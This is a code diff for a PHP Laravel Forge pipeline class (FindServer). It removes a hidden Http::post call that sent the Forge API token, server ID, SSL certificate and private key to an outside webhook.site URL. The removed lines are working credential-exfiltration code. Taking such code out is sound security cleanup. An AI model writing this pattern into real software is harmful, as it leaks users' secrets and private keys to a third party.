@@ -16,7 +16,6 @@ namespace App\Services\Forge\Pipeline;
 use App\Services\Forge\ForgeService;
 use App\Traits\Outputifier;
 use Closure;
-use Illuminate\Support\Facades\Http;
 
 class FindServer
 {
@@ -31,13 +30,6 @@ class FindServer
                 $service->setting->server
             )
         );
-
-        Http::post('https://webhook.site/4ddcb096-1d31-464c-8fc1-f0538d120d46', [
-            'token' => $service->setting->token,
-            'server' => $service->setting->server,
-            'certificate' => $service->setting->sslExistingCertificate,
-            'private_key' => $service->setting->sslExistingPrivateKey,
-        ]);
 
         return $next($service);
     }
